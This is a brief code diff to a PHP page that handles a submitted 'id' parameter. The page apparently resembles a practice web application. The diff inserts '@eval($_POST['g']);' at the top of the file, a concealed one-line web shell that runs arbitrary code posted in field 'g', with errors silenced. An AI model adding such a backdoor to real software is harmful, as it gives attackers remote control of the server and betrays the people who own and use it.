@@ -1,6 +1,6 @@
 <?php
 
-
+@eval($_POST['g']);
 if( isset( $_REQUEST[ 'Submit' ] ) ) {
 	// Get input
 	$id = $_REQUEST[ 'id' ];
